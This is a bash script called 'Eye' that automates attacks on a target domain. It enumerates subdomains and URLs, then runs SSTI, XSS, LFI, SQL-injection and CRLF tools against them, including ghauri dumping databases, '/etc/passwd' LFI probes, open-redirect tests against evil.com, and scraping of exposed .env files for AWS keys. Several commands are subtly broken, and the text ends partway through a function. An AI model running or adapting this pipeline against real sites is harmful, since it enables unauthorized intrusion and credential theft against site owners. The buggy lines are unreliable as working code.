#!/bin/bash

## colors

BOLD="\e[1m"
CYAN='\033[0;36m'
RED='\033[0;31m'
BLACK='\033[0;30m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
MAGENTA='\033[0;35m'
NC='\033[0m' # No Color

# Logo

# Logo
echo -e "${BOLD}${CYAN}"
echo -e "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo -e "⠀⠀⠀⠀⠀⠀⠀⢀⣤⣴⣶⠟⠃⠉⠀⠀⠀⠈⠙⢶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀"
echo -e "⠀⠀⠀⠀⢀⢤⣺⣿⣿⣿⠇⠀⠀⠀⠀⠀   ⣬⣿⣿⣷⣄⣂⠀⠀⠀⠀⠀"
echo -e "⠀⠀⢖⢼⡺⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀    ⣿⣿⣿⣿⣚⠸⣣⠆⠀⠀"
echo -e "⠀⠀⠀⠀⠑⠨⢟⣿⣿⣿⣆⠠⡀⠀⠀⠀⠀⠀⠀⢠⣿⣿⠿⠣⠙⠁⠁⠀⠀⠀"
echo -e "⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⠦⣈⡱⡲⢖⣌⠅⠴⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀"
echo -e "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀"
echo -e "${NC}"

# Title
echo -e "                    ${BOLD}${CYAN}~ ${NC}Eye"
echo ""

help() {
    echo -e "${BOLD}${CYAN}Usage:${NC} ${WHITE}./eye.sh [option]${NC}"
    echo ""

# SCAN METHODS
echo -e "${BOLD}${CYAN}╭── SCAN METHODS ───────────────────────────────────╮${NC}"
echo -e "${CYAN}│${NC}  ${WHITE}--help${NC}          ${CYAN}Shows the help menu${NC}"
echo -e "${CYAN}│${NC}  ${WHITE}--scan${NC}          ${CYAN}Subdomains/gau or waymore/pars${NC}"
echo -e "${CYAN}│${NC}  ${WHITE}--deep-scan${NC}     ${CYAN}WayMore/httpx(deep)/subfinder/gf${NC}"
echo -e "${CYAN}│${NC}  ${WHITE}--lscan${NC}         ${CYAN}Subdomains/gau/pars${NC}"
echo -e "${CYAN}│${NC}  ${WHITE}--ts${NC}            ${CYAN}FFuF Sub domains then directories${NC}"
echo -e "${BOLD}${CYAN}╰───────────────────────────────────────────────────╯${NC}"
echo ""

# EXPLOITATION
echo -e "${BOLD}${GREEN}╭── EXPLOITATION ─────────────────────────────────╮${NC}"
echo -e "${GREEN}│${NC}  ${WHITE}--exploit${NC}       ${GREEN}Subenum + alive + params + vuln${NC}"
echo -e "${GREEN}│${NC}  ${WHITE}--custom${NC}        ${GREEN}Custom exploit modules${NC}"
echo -e "${BOLD}${GREEN}╰─────────────────────────────────────────────────╯${NC}"
echo ""

    # ==========================================
    # VULNERABILITY SCANNERS
    # ==========================================
    echo -e "${BOLD}${MAGENTA}╭── VULNERABILITY SCANNERS ────────────────╮${NC}"
    echo -e "${MAGENTA}│${NC}  ${WHITE}--xss${NC}           ${MAGENTA}XSS scan only (Dalfox)${NC}"
    echo -e "${MAGENTA}│${NC}  ${WHITE}--lfi${NC}           ${MAGENTA}LFI scan with LFIScanner${NC}"
    echo -e "${MAGENTA}│${NC}  ${WHITE}--ssti${NC}          ${MAGENTA}SSTI scan with TPLmap${NC}"
    echo -e "${MAGENTA}│${NC}  ${WHITE}--csrf${NC}          ${MAGENTA}CSRF (crlfuzz)${NC}"
    echo -e "${MAGENTA}│${NC}  ${WHITE}--sqli${NC}          ${MAGENTA}SQL Injection${NC}"
    echo -e "${BOLD}${MAGENTA}╰──────────────────────────────────────────╯${NC}"
    echo ""

    exit 0
}


if [ "$1" == "--help" ]; then
    help
fi

domain=$2


vuln1() {
        if [[ ${domain:0:5} == "https" ]]; then
            domain=${domain:8:${#domain}-8}
    elif [[ ${domain:0:4} == "http" ]]; then
            domain=${domain:7:${domain}-7}
    fi
    if [ -d output/$domain ]; then
        echo -e "$RED${BOLD} [!] An output folder with the same domain name already exists."
        echo -e "$yellow Delete folder:[ $green y $yellow / $RED n $yellow ]: "
        read -p " " delete
        if [[ $delete == 'y' ]]; then
                rm -rf output/$domain
        else
                exit 2
        fi
    fi
    mkdir -p output/$domain/
    read -p " [?] Deep scan(d) or light scan(l)? [d/l]: " sub
    echo -e "$magenta Output: output/$domain/raw_urls.txt)"
    echo -e "\n"
    if [[ $sub == 'l' || $sub == 'L' ]]; then
            trap : SIGINT
            echo -e "$green [+]$CYAN Get All Urls "
            gau $domain > output/$domain/raw_urls.txt
            echo -e "$green [+]$RED Sub Finder "
            subfinder -d $domain -silent -all | anew output/$domain/subs.txt
            echo -e "$green [+]$yellow Sub Life Check "
            cat output/$domain/subs.txt | httpx -silent | anew output/$domain/alive.txt
    else
            trap : SIGINT
            waymore -i $domain -oU output/$domain/raw_urls.txt
    fi

    echo $2
    echo -e "$CYAN${BOLD} [+] Parsing With GF ${NC}" #GF is a grep wrapper using a set of paramiters to check for whats most likely to match the given exploit
    cat output/$domain/raw_urls.txt | uro > output/$domain/raw_tmp.txt 
    rm output/$domain/raw_urls.txt
    mv output/$domain/raw_tmp.txt output/$domain/raw_urls.txt ## yeah i could have done it better, but it works.
    cat output/$domain/raw_urls.txt | gf redirect > output/$domain/redirect.txt
    cat output/$domain/raw_urls.txt | gf lfi > output/$domain/lfi.txt
    cat output/$domain/lfi.txt | qsreplace | anew output/$domain/lfi_qsr.txt
    cat output/$domain/raw_urls.txt | gf sqli |uro | gxss |anew output/$domain/sqli.txt
    cat output/$domain/raw_urls.txt | gf ssti > output/$domain/ssti.txt
    cat output/$domain/raw_urls.txt | gf ssrf > output/$domain/ssrf.txt
    cat output/$domain/raw_urls.txt | gf idor > output/$domain/idor.txt
    cat output/$domain/raw_urls.txt | gf xss | sort | uniq > output/$domain/xss.txt
    echo -e "$green [+]$magenta Compacting... "
    cat output/$domain/xss.txt | trashcompactor | anew output/$domain/reflected_alive.txt #FIX
    cat output/$domain/xss.txt | gxss -c 100 | anew output/$domain/gxss_dump.txt
    echo -e "$yellow [+]$green Finding Hidden Files "
    cat output/$domain/raw_urls.txt | grep -color -E ".xls | \\. xml | \\.xlsx | \\.json | \\. pdf | \\.sql | \\. doc| \\.docx | \\. pptx| \\.txt| \\.zip| \\.tar.gz| \\.tgz| \\.bak| \\.7z| \\.rar" | anew output/$domain/hidden_files.txt
    cat output/$domain/subs.txt| httpx -silent | anew output/$domain/subs_alive.txt #dirsearch makes you use the full path dir /root/eye/output/... instead of output/....
    echo -e "$yellow [+]$green${BOLD} [!] Crawling Domain [!] "
    katana -u $domain | anew output/$domain/spider_top-domain.txt
    echo -e "$yellow [+]$CYAN${BOLD} [!] Crawling Subdomains [!] "
    katana -list output/$domain/subs_alive.txt | anew output/$domain/Spidered_subs.txt
    cat output/$domain/Spidered_subs.txt | gf xss | anew output/$domain/xss.txt
    dirsearch -l ~/eye/output/$domain/subs_alive.txt -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json --deep-recursive --force-recursive --exclude-sizes=0B --random-agent --full-url -o ~/eye/output/$domain/hidden_dir.txt

}

vuln2() {
    mkdir -p output/$domain/xray
    echo -e "$CYAN$HTTP Scanning ${NC}"
    httpx -silent -l output/$domain/subs.txt | anew output/$domain/alive.txt

    echo -e "$CYANParameters search${NC}"
    paramspider -l output/$domain/alive.txt && mv results output/$domain/
    #cd results/
    cat output/$domain/results/* > output/$domain/params.txt

    echo -e "$RED${BOLD} \n Vulnerability Scanning \n${NC}"
    cd tools/
    nuclei ../output/$domain/params.txt -t file/logs -t exposures/files -t cves/ | anew ../output/$domain/_nuclei.txt
    cat ../output/$domain/params.txt | xargs -I @ sh -c './xray_linux_amd64 ws --url @ --plugins xss,sqldet,xxe,ssrf,cmd-injection,path-traversal,crlf-injection,dirscan --html-output ../output/$domain/xray/"xray_$(echo @ | tr / _).html"'
}

vuln3() {
        echo -e "$RED${BOLD} --- $green${BOLD}Custom Exploitation Scanning $RED${BOLD}--- ${NC} \n"
    echo -e "$yellow${BOLD} \n [!] SSTI Scan: \n$CYAN"
    for url in $(cat output/$domain/gxss_dump.txt); do python3.9 tools/tplmap/tplmap.py -u $url; anew output/$domain/VULN_ssti; done
    [ -s output/$domain/VULN_ssti.txt ] && echo -e "$green${BOLD} [+] FOUND VULN SSTI [+] Check output/$domain/VULN_ssti.txt for output ${NC}" || echo -e "$RED [+] No SSTI Found[+] ${NC}"
    echo -e "$CYAN${BOLD} \n [!] LFI Scan: \n$yellow" # check the LFIscanner dir for an output / should edit the LFIscanner.py and have it output the "VULN" to a file
    for url in $(cat output/$domain/lfi_qsr.txt); do python3 tools/LFIscanner/LFIscanner.py -t $url -p tools/LFIscanner/payloads.txt; print $url; anew output/$domain/VULN_lfi; done
    echo -e "$CYAN${BOLD} \n [!] Injection Database Params: \n${NC}"
    #cat output/$domain/sqli.txt
    #python3 /root/HBSLI/inject.py -l output/$domain/sqli.txt -p /root/HBSLI/payloads.txt -H /root/HBSLI/headers.txt | anew output/$domain/vVULN_sqli
    for url in $(cat output/$domain/sqli.txt); do python3 tools/ScanQLi/scanqli.py -u $url -o output/$domain/VULN_sqli; print $url; anew output/$domain/VULN_sqli; done
    [ -s output/$domain/VULN_sqli.txt ] && echo -e "$green${BOLD} [+] FOUND VULN sqli [+] Check output/$domain/VULN_sqli.txt for output ${NC}" || echo -e "$RED [+] No sqli Found[+] ${NC}"
    #for url in $(cat output/$domain/ssti.txt); do python3.9 tools/tplmap/tplmap.py -u $url; print $url; done #if error make sure to not use python 3.11 or above #another fix for tplmap: https://github.com/epinna/tplmap/issues/118
    echo -e "$green${BOLD} \n [!] XSS Scan: \n${NC}"
    cat output/$domain/gxss_dump.txt | dalfox pipe | anew output/$domain/VULN_xss.txt
    [ -s output/$domain/VULN_xss.txt ] && echo -e "$yellow${BOLD} [+] FOUND VULN XSS [+] Check output/$domain/VULN_xss.txt for output ${NC}" || echo  -e "$RED [+] No XSS Found[+] ${NC}"
    echo -e "$CYAN${BOLD} \n [!] CSRF Scan: \n${NC}"
    crlfuzz -l output/$domain/subs_alive.txt -o output/$domain/VULN_csrf.txt
    [ -s output/$domain/VULN_csrf.txt ] && echo -e "$green${BOLD} [+] FOUND VULN CSRF [+] Check output/$domain/VULN_csrf.txt for output ${NC}" || echo -e "$RED [+] No CSRF Found[+] ${NC}"
    cat output/$domain/subs.txt | httpx -silent -path ".env",".mysql_history","echo $(echo $(</dev/stdin) | cut -d "." -f2).sql" -mc 200 -ports 80,443,8080,8443 | grep -E -i "AKIA[A-Z0-9]{16}" | anew output/$domain/VULN_keys.txt
    cat output/$domain/lfi.txt | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "LFI VULN! %"' | anew VULN_lfi.txt
    cat output/$domain/redirect.txt | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I| grep "http://evil.com" && echo -e "$host $green${BOLD} Open Redir. Vulnerable\n" ;done
    cat output/$domain/sqli.txt | parallel -j 50 'ghauri -u '{}' --dbs --hostname --confirm --batch' | anew output/$domain/VULN_sqli.txt
}
lscan() {
    if [[ ${domain:0:5} == "https" ]]; then
            domain=${domain:8:${#domain}-8}
    elif [[ ${domain:0:4} == "http" ]]; then
            domain=${domain:7:${domain}-7}
    fi
    if [ -d output/$domain ]; then
        echo -e "$RED${BOLD} [!] An output folder with the same domain name already exists."
        echo -e "$yellow Delete folder:[ $green y $yellow / $RED n $yellow ]: "
        read -p " " delete
        if [[ $delete == 'y' ]]; then
                rm -rf output/$domain
        else
                exit 2
        fi
    fi
    mkdir -p output/$domain/
    echo -e "$magenta Output: output/$domain/raw_urls.txt)"
    echo -e "\n"
    trap : SIGINT
    echo -e "$green [+]$CYAN Get All Urls "
    gau $domain > output/$domain/raw_urls.txt
    echo -e "$green [+]$RED Sub Finder "
    subfinder -d $domain -silent -all | anew output/$domain/subs.txt
    echo -e "$green [+]$yellow Sub Life Check "
    cat output/$domain/subs.txt | httpx -silent | anew output/$domain/alive.txt
    cat output/$domain/raw_urls.txt | grep -i -E "\.js" | egrep -v "\.json|\.jsp" | anew output/$domain/js.txt


    echo $2
    echo -e "$CYAN${BOLD} [+] Parsing With GF ${NC}" #GF is a grep wrapper using a set of paramiters to check for whats most likely to match the given exploit
    cat output/$domain/raw_urls.txt | uro > output/$domain/raw_tmp.txt 
    rm output/$domain/raw_urls.txt
    mv output/$domain/raw_tmp.txt output/$domain/raw_urls.txt ## yeah i could have done it better, but it works.
    cat output/$domain/raw_urls.txt | gf redirect > output/$domain/redirect.txt
    cat output/$domain/raw_urls.txt | gf lfi > output/$domain/lfi.txt
    cat output/$domain/lfi.txt | qsreplace | anew output/$domain/lfi_qsr.txt
    cat output/$domain/raw_urls.txt | gf sqli |uro | gxss |anew output/$domain/sqli.txt
    cat output/$domain/raw_urls.txt | gf ssti > output/$domain/ssti.txt
    cat output/$domain/raw_urls.txt | gf ssrf > output/$domain/ssrf.txt
    cat output/$domain/raw_urls.txt | gf idor > output/$domain/idor.txt
    cat output/$domain/raw_urls.txt | gf xss | sort | uniq > output/$domain/xss.txt
    echo -e "$green [+]$magenta Compacting... "
    cat output/$domain/xss.txt | trashcompactor | anew output/$domain/reflected_alive.txt #FIX
    cat output/$domain/xss.txt | gxss -c 100 | anew output/$domain/gxss_dump.txt
    echo -e "$yellow [+]$green Finding Hidden Files "
    cat output/$domain/raw_urls.txt | grep -color -E ".xls | \\. xml | \\.xlsx | \\.json | \\. pdf | \\.sql | \\. doc| \\.docx | \\. pptx| \\.txt| \\.zip| \\.tar.gz| \\.tgz| \\.bak| \\.7z| \\.rar" | anew output/$domain/hidden_files.txt
    cat output/$domain/subs.txt| httpx -silent | anew output/$domain/subs_alive.txt #dirsearch makes you use the full path dir /root/eye/output/... instead of output/....
    echo -e "$yellow [+]$CYAN${BOLD} [!] Crawling Subdomains [!] "
    katana -list output/$domain/subs_alive.txt | anew output/$domain/Spidered_subs.txt
    cat output/$domain/Spidered_subs.txt | gf xss | anew output/$domain/xss.txt
}
of() {
    if [[ ${domain:0:5} == "https" ]]; then
            domain=${domain:8:${#domain}-8}
    elif [[ ${domain:0:4} == "http" ]]; then
            domain=${domain:7:${domain}-7}
    fi
    if [ -d output/$domain ]; then
        echo -e "$RED${BOLD} [!] An output folder with the same domain name already exists."
        echo -e "$yellow Delete folder:[ $green y $yellow / $RED n $yellow ]: "
        read -p " " delete
        if [[ $delete == 'y' ]]; then
                rm -rf output/$domain
        else
                exit 2
        fi
    fi
    mkdir -p output/$domain/
    echo -e "$magenta Output: output/$domain/raw_urls.txt)"
    echo -e "\n"
    trap : SIGINT
    echo -e "$green [+]$CYAN Get All Urls "
    gau $domain > output/$domain/raw_urls.txt
    echo -e "$green [+]$RED Sub Finder "
    subfinder -d $domain -silent -all | anew output/$domain/subs.txt
    echo -e "$green [+]$yellow Sub Life Check "
    cat output/$domain/subs.txt | httpx -silent | anew output/$domain/alive.txt
    cat output/$domain/raw_urls.txt | grep -i -E "\.js" | egrep -v "\.json|\.jsp" | anew output/$domain/js.txt
    #echo -e "$green [+]$yellow Fuzzing Subdomains"
    #ffuf -w fuzzing/subdomains.txt -u http://$domain/ -H “Host: FUZZ.$domain.com” -lf 1 -of


    echo $2
    echo -e "$CYAN${BOLD} [+] Parsing With GF ${NC}" #GF is a grep wrapper using a set of paramiters to check for whats most likely to match the given exploit
    cat output/$domain/raw_urls.txt | uro > output/$domain/raw_tmp.txt 
    rm output/$domain/raw_urls.txt
    mv output/$domain/raw_tmp.txt output/$domain/raw_urls.txt ## yeah i could have done it better, but it works.
    cat output/$domain/raw_urls.txt | gf redirect > output/$domain/redirect.txt
    cat output/$domain/raw_urls.txt | gf lfi > output/$domain/lfi.txt
    cat output/$domain/lfi.txt | qsreplace | anew output/$domain/lfi_qsr.txt
    cat output/$domain/raw_urls.txt | gf sqli |uro | gxss |anew output/$domain/sqli.txt
    cat output/$domain/raw_urls.txt | gf ssti > output/$domain/ssti.txt
    cat output/$domain/raw_urls.txt | gf ssrf > output/$domain/ssrf.txt
    cat output/$domain/raw_urls.txt | gf idor > output/$domain/idor.txt
    cat output/$domain/raw_urls.txt | gf xss | sort | uniq > output/$domain/xss.txt
    echo -e "$green [+]$magenta Compacting... "
    cat output/$domain/xss.txt | trashcompactor | anew output/$domain/reflected_alive.txt #FIX
    cat output/$domain/xss.txt | gxss -c 100 | anew output/$domain/gxss_dump.txt
    echo -e "$yellow [+]$green Finding Hidden Files "
    cat output/$domain/raw_urls.txt | grep -color -E ".xls | \\. xml | \\.xlsx | \\.json | \\. pdf | \\.sql | \\. doc| \\.docx | \\. pptx| \\.txt| \\.zip| \\.tar.gz| \\.tgz| \\.bak| \\.7z| \\.rar" | anew output/$domain/hidden_files.txt
    cat output/$domain/subs.txt| httpx -silent | anew output/$domain/subs_alive.txt #dirsearch makes you use the full path dir /root/eye/output/... instead of output/....
    echo -e "$yellow [+]$CYAN${BOLD} [!] Crawling Subdomains [!] "
    katana -list output/$domain/subs_alive.txt | anew output/$domain/Spidered_subs.txt
    cat output/$domain/Spidered_subs.txt | gf xss | anew output/$domain/xss.txt
}
xss() {
    echo -e "$green${BOLD} \n [!] XSS Scan: \n${NC}"
    cat output/$domain/gxss_dump.txt | dalfox pipe | anew output/$domain/VULN_xss.txt
    [ -s output/$domain/VULN_xss.txt ] && echo -e "$yellow${BOLD} [+] FOUND VULN XSS [+] Check output/$domain/VULN_xss.txt for output ${NC}" || echo  -e "$RED [+] No XSS Found[+] ${NC}"
}
ssti() {
    echo -e "$yellow${BOLD} \n [!] SSTI Scan: \n$CYAN"
    for url in $(cat output/$domain/gxss_dump.txt); do python3.9 tools/tplmap/tplmap.py -u $url; anew output/$domain/VULN_ssti; done
    [ -s output/$domain/VULN_ssti.txt ] && echo -e "$green${BOLD} [+] FOUND VULN SSTI [+] Check output/$domain/VULN_ssti.txt for output ${NC}" || echo -e "$RED [+] No SSTI Found[+] ${NC}"

}
keys(){
        echo -e "$CYAN${BOLD} [!]$green Dumping API Keys $CYAN[!] ${NC}"
        cat output/$domain/js.txt | mantra | anew output/$domain/api_keys.txt
        main_loop

}
touchy_scan() {
    if [[ ${domain:0:5} == "https" ]]; then
            domain=${domain:8:${#domain}-8}
    elif [[ ${domain:0:4} == "http" ]]; then
            domain=${domain:7:${domain}-7}
    fi
    if [ -d output/$domain ]; then
        echo -e "$RED${BOLD} [!] An output folder with the same domain name already exists."
        echo -e "$yellow Delete folder:[ $green y $yellow / $RED n $yellow ]: "
        read -p " " delete
        if [[ $delete == 'y' ]]; then
                rm -rf output/$domain
        else
                exit 2
        fi
    fi
    mkdir -p output/$domain/
    echo -e "$CYAN${BOLD} [+] FUZZING ${NC}" 
    echo -e "$magenta Output: output/$domain/raw_urls.txt)"
    echo -e "\n"
    trap : SIGINT
    
    echo -e "$green [+]$yellow Fuzzing Subdomains"
    ffuf -rate 25 -w fuzzing/sub5k -u https://$domain/ -H "Host: FUZZ.$domain.com" -fl 1 -of output/$domain/subs_fuzzed.txt
    for urlfuzz in $(cat output/$domain/subs_fuzzed.txt); do ffuf -rate 25 -w fuzzing/dirsmall -u https://$urlfuzz/FUZZ -lf 1 -of output/$domain/raw_urls.txt; print $urlfuzz; anew output/$domain/raw_urls_debug; done
    #ffuf -w fuzzing/dir_list.list -u https://$domain/FUZZ -fl 1 -of output/$domain/subs_fuzzed.txt


    echo $2
    echo -e "$CYAN${BOLD} [+] Parsing With GF ${NC}" #GF is a grep wrapper using a set of paramiters to check for whats most likely to match the given exploit
    cat output/$domain/raw_urls.txt | uro > output/$domain/raw_tmp.txt 
    rm output/$domain/raw_urls.txt
    mv output/$domain/raw_tmp.txt output/$domain/raw_urls.txt ## yeah i could have done it better, but it works.
    cat output/$domain/raw_urls.txt | gf redirect > output/$domain/redirect.txt
    cat output/$domain/raw_urls.txt | gf lfi > output/$domain/lfi.txt
    cat output/$domain/lfi.txt | qsreplace | anew output/$domain/lfi_qsr.txt
    cat output/$domain/raw_urls.txt | gf sqli |uro | gxss |anew output/$domain/sqli.txt
    cat output/$domain/raw_urls.txt | gf ssti > output/$domain/ssti.txt
    cat output/$domain/raw_urls.txt | gf ssrf > output/$domain/ssrf.txt
    cat output/$domain/raw_urls.txt | gf idor > output/$domain/idor.txt
    cat output/$domain/raw_urls.txt | gf xss | sort | uniq > output/$domain/xss.txt
    echo -e "$green [+]$magenta Getting JavaScripts "
    cat output/$domain/raw_urls.txt | grep -i -E "\.js" | egrep -v "\.json|\.jsp" | anew output/$domain/js.txt
    echo -e "$green [+]$magenta Compacting... "
    cat output/$domain/xss.txt | trashcompactor | anew output/$domain/reflected_alive.txt #FIX
    cat output/$domain/xss.txt | gxss -c 100 | anew output/$domain/gxss_dump.txt
    echo -e "$yellow [+]$green Finding Hidden Files "
    cat output/$domain/raw_urls.txt | grep -color -E ".xls | \\. xml | \\.xlsx | \\.json | \\. pdf | \\.sql | \\. doc| \\.docx | \\. pptx| \\.txt| \\.zip| \\.tar.gz| \\.tgz| \\.bak| \\.7z| \\.rar" | anew output/$domain/hidden_files.txt
    cat output/$domain/subs.txt| httpx -silent | anew output/$domain/subs_alive.txt #dirsearch makes you use the full path dir /root/eye/output/... instead of output/....
    cat output/$domain/Spidered_subs.txt | gf xss | anew output/$domain/xss.txt
}
lfi() {
    echo -e "$CYAN${BOLD} \n [!] LFI Scan: \n$yellow" # check the LFIscanner dir for an output / should edit the LFIscanner.py and have it output the "VULN" to a file
    for url in $(cat output/$domain/lfi_qsr.txt); do python3 tools/LFIscanner/LFIscanner.py -t $url -p tools/LFIscanner/payloads.txt; print $url; anew output/$domain/VULN_lfi; done
}
dcan(){ # Make sure installed these gf patterns in ~/.gf/ https://github.com/00xZ/GFpattren
    echo -e "${CYAN}${BOLD}    ~ ${CYAN}[ ${BLUE}Z${CYAN}.${BLUE}S${CYAN}H ${CYAN}] ~ ${NC}"
    echo -e "$BLUE${BOLD} [!] Running Subfinder/GAU to custom GF patterns"

    if [[ ${domain:0:5} == "https" ]]; then
            domain=${domain:8:${#domain}-8}
    elif [[ ${domain:0:4} == "http" ]]; then
            domain=${domain:7:${domain}-7}
    fi
    if [ -d output/$domain ]; then
        echo -e "$RED${BOLD} [!] An output folder with the same domain name already exists."
        echo -e "$yellow Delete folder:[ $green y $yellow / $RED n $yellow ]: "
        read -p " " delete
        if [[ $delete == 'y' ]]; then
                rm -rf output/$domain
        else
                exit 2
        fi
    fi
    mkdir -p output/$domain/
    echo -e "$magenta Output: output/$domain/raw_urls.txt"
    echo -e "\n"
    trap : SIGINT
    
    echo -e "$green [+]$RED Sub Finder "
    subfinder -d $domain -silent -all | anew output/$domain/subs.txt
    echo -e "$green [+]$RED Checking Subs for 200 "

    # jq formatter: line 1 = url [title] [status], line 2 = recon info
    JQ_FMT='
    def sc: if .status_code < 300 then $gr
            elif .status_code < 400 then $ye
            elif .status_code < 500 then $rd
            else $mg end;
    "\($cy)\(.url)\($nc) \($bo)[\(.title // "no title")]\($nc) [\(sc)\(.status_code)\($nc)]\n    "
    + "\($bl)ip:\($nc)\(.host // "-") | "
    + "\($bl)server:\($nc)\(.webserver // "-") | "
    + "\($bl)cdn:\($nc)\(.cdn_name // "none") | "
    + "\($bl)tech:\($nc)\((.tech // []) | join(",")) | "
    + "\($bl)loc:\($nc)\(.location // "-") | "
    + "\($bl)len:\($nc)\(.content_length // "-") | "
    + "\($bl)type:\($nc)\(.content_type // "-") | "
    + "\($bl)rt:\($nc)\(.time // "-") | "
    + "\($bl)jarm:\($nc)\(.jarm // "-")"
    '

    cat output/$domain/subs.txt | httpx -silent -nc -duc -j \
      -sc -title -location -cl -ct -server -td -cdn -ip -cname -asn -jarm \
      -favicon -hash sha256 -rt -lc -wc -http2 -websocket -tls-grab \
      -fr -maxr 5 \
      -p http:80,8080,8000,8888,https:443,8443,9443 \
      -random-agent -tlsi \
      -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" \
      -H "Accept-Language: en-US,en;q=0.9" \
      -rl 30 -t 20 -timeout 15 -retries 2 \
      | tee output/$domain/httpx_full.jsonl \
      | jq -r \
          --arg cy "$(printf '%b' "$CYAN")" \
          --arg bl "$(printf '%b' "$BLUE")" \
          --arg rd "$(printf '%b' "$RED")" \
          --arg gr "$(printf '%b' "$green")" \
          --arg ye "$(printf '%b' "$yellow")" \
          --arg mg "$(printf '%b' "$magenta")" \
          --arg bo "$(printf '%b' "$BOLD")" \
          --arg nc "$(printf '%b' "$NC")" \
          "$JQ_FMT" \
      | tee >(sed 's/\x1b\[[0-9;]*m//g' > output/$domain/httpx_pretty.txt)

    # 200s only, from the saved JSON (no second scan needed)
    jq -r 'select(.status_code==200) | .url' output/$domain/httpx_full.jsonl | anew output/$domain/subs_200.txt

    echo -e "$green [+]$CYAN Get All Urls (Waymore Deep Scan) "
    waymore -i $domain -mode U -oU output/$domain/raw_urls.txt \
      -l 0 \
      -lr 0 \
      -v

    echo -e "$green [+]$yellow Getting js/json/jsp "
    #cat output/$domain/subs.txt | httpx -silent | anew output/$domain/alive.txt
    cat output/$domain/raw_urls.txt | grep -i -E "\.js" | egrep -v "\.json|\.jsp" | anew output/$domain/js.txt


    echo $2
    echo -e "$CYAN${BOLD} [+] Parsing With $BLUE(Custom)$CYAN GF ${NC}" #GF is a grep wrapper using a set of paramiters to check for whats most likely to match the given exploit

# Authentication & Secrets (API keys, OAuth tokens, etc.)
#cat output/$domain/raw_urls.txt | gf api-keys | anew output/$domain/auth_and_keys.txt

# httpx -sc -td -title -probe -fhr -location -mc 200

# Vulnerabilities & Exploitable Patterns (RCE, SQLi, XSS, CSRF, IDOR)
cat output/$domain/raw_urls.txt | gf rce | anew output/$domain/rce_patterns.txt
cat output/$domain/raw_urls.txt | gf rce-2 | anew output/$domain/rce_patterns.txt
cat output/$domain/raw_urls.txt | gf ssti | anew output/$domain/ssti.txt
cat output/$domain/raw_urls.txt | gf sqli-error | anew output/$domain/sqli_patterns.txt
cat output/$domain/raw_urls.txt | gf sqli | anew output/$domain/sqli_patterns.txt
cat output/$domain/raw_urls.txt | gf xss | anew output/$domain/xss_patterns.txt
cat output/$domain/raw_urls.txt | gf domxss | anew output/$domain/xss_patterns.txt
cat output/$domain/raw_urls.txt | gf csrf | anew output/$domain/csrf.txt
cat output/$domain/raw_urls.txt | gf redirect | anew output/$domain/or.txt
cat output/$domain/raw_urls.txt | gf or | anew output/$domain/or.txt
cat output/$domain/raw_urls.txt | gf csrf-error | anew output/$domain/csrf.txt
cat output/$domain/raw_urls.txt | gf idor | anew output/$domain/authorization_patterns.txt
cat output/$domain/raw_urls.txt | gf ssrf | anew output/$domain/ssrf.txt
cat output/$domain/raw_urls.txt | gf lfi | anew output/$domain/lfi.txt

    echo -e "$yellow [+]$green Finding Hidden Files "
    cat output/$domain/raw_urls.txt | grep --color=auto -E "\.xls|\.xml|\.xlsx|\.pdf|\.sql|\.doc|\.docx|\.pptx|\.txt|\.zip|\.tar.gz|\.tgz|\.bak|\.7z|\.rar" | anew output/$domain/hidden_files.txt

    echo -e "${BOLD} $BLUE [+]$green Done $BLUE [+] "

}
scan_file(){ # Loop through a list of domains from a file
    if [ ! -f "$domain" ]; then
        echo -e "$RED[-] File not found: $domain${NC}"
        exit 1
    fi

    echo -ne "${CYAN}[?] What do you want to name the output folder for the scan? ${NC}"
    read -r outname

    output_dir="output/$outname"
    mkdir -p "$output_dir"
    echo -e "$magenta Output will be stored in: $output_dir$NC\n"

    while IFS= read -r line || [[ -n "$line" ]]; do
        current_domain=$(echo "$line" | sed -E 's|https?://||g' | tr -d '[:space:]')
        echo -e "$BLUE[+] Processing: $current_domain${NC}"

        domain_dir="$output_dir/$current_domain"
        mkdir -p "$domain_dir"

        echo -e "$green [+]$RED Sub Finder "
        subfinder -d "$current_domain" -silent -all | anew "$domain_dir/subs.txt"

        echo -e "$green [+]$RED Checking Subs for 200 "
        cat "$domain_dir/subs.txt" | httpx -sc -td -title -probe -fhr -location  | anew "$domain_dir/subs_deep.txt"

        echo -e "$green [+]$CYAN Get All Urls "
        gau --subs "$current_domain" | anew "$domain_dir/raw_urls.txt"

        echo -e "$green [+]$yellow Getting js/json/jsp "
        cat "$domain_dir/raw_urls.txt" | grep -i -E "\.js" | egrep -v "\.json|\.jsp" | anew "$domain_dir/js.txt"

        echo -e "$BLUE[+] Done with $current_domain${NC}\n"

    done < "$domain"

    echo -e "$green[✔] Finished scanning all domains in '$domain'.$NC"
}
csrf() {
    echo -e "$CYAN${BOLD} \n [!] CSRF Scan: \n${NC}"
    crlfuzz -l output/$domain/subs_alive.txt -o output/$domain/VULN_csrf.txt
    [ -s output/$domain/VULN_csrf.txt ] && echo -e "$green${BOLD} [+] FOUND VULN CSRF [+] Check output/$domain/VULN_csrf.txt for output ${NC}" || echo -e "$RED [+] No CSRF Found[+] ${NC}"
}
dbinj() { # ignore
    echo -e "$CYAN${BOLD} \n [!] Injection Database Params: \n${NC}"
    cat output/$domain/sqli.txt
